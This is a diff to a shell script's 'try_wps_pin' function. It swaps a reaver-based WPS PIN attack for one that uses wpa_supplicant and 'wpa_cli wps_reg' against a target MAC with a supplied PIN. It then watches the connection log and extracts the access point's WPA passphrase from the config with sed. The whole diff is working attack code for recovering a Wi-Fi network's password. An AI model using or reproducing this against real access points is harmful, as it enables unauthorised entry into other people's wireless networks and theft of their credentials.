@@ -13,9 +13,45 @@ try_wps_pin(){
     PIN="$7"
 
     [ "$ENC" == off ] && return 2
+    WPA_CONF=/tmp/wpa.conf
+    WPA_LOG=/tmp/wpa.log
+    rm $WPA_LOG
+    #mkfifo $WPA_LOG
+    killall wpa_supplicant && sleep 1
+	
+    cat > $WPA_CONF <<EOF 
+ctrl_interface=/var/run/wpa_supplicant
+ctrl_interface_group=0
+update_config=1
+EOF
+    wpa_supplicant -Dwext -iwlan0 -c $WPA_CONF -f $WPA_LOG &
+    sleep 2
+    if !(sudo wpa_cli wps_reg $MAC $PIN  | grep -q OK) ;then
+        echo "wpa_cli wps_reg failed, bailing out!"
+        return 1
+    fi
 
-    airmon-ng start ${WIFI:-wlan0}  $CHANNEL
-    sleep 1
-    reaver -i mon0 -b $MAC -vv -p "$PIN" -f -c $CHANNEL || :
-    airmon-ng stop mon0
+    WPA_PID=$!
+	    #*"WPA: Key negotiation completed"*)
+            # association failed
+            #    exit 1 ;;
+    if ( tail -f $WPA_LOG & echo "TAILPID: $!" )| while read line ; do
+        case "$line" in
+	    TAILPID:*)IFS=" " set -- $line; TAILPID=$2;;
+            *CTRL-EVENT-DISCONNECTED*):;;
+            *CTRL-EVENT-CONNECTED*)
+		kill -HUP $TAILPID
+                exit 0;;
+
+        esac
+    done ; then
+	echo "Connected!"
+	sed -n 's/[ \t]*psk="\(.*\)"$/\1/p' $WPA_CONF
+	return 0
+    else
+	echo "failed!"
+	return 1
+    fi
+    kill $WPA_PID
+
 }
